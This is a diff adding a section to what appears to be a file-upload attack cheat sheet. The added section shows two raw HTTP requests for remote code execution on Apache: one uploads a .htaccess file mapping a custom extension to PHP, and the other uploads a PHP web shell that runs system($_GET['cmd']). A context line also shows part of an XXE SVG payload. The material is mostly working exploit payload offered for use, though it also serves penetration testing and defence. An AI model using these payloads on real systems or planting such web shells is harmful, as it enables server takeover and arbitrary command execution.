@@ -147,3 +147,33 @@ Content-Type: image/svg+xml
 <svg>&xxe;</svg>
 -----------------------------4829104394923874193918493216
 ```
+#### Htaccess Extention Allowed - RCE
+Only works on Apache servers. The uploaded .htaccess file will change the apache configuration to allow us to up a php file under a different extension.
+```
+POST /upload HTTP/1.1
+Host: website.com
+Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216
+
+-----------------------------4829104394923874193918493216
+Content-Disposition: form-data; name="avatar"; filename="webshell.htaccess"
+Content-Type: plain/text
+
+AddType application/x-httpd-php .shelled
+-----------------------------4829104394923874193918493216
+```
+
+```
+POST /upload HTTP/1.1
+Host: website.com
+Content-Type: multipart/form-data; boundary=-----------------------------4829104394923874193918493216
+
+-----------------------------4829104394923874193918493216
+Content-Disposition: form-data; name="avatar"; filename="webshell.shelled"
+Content-Type: text/php
+
+<?php 
+echo "shelled: ";
+system($_GET['cmd']); 
+?>
+-----------------------------4829104394923874193918493216
+```
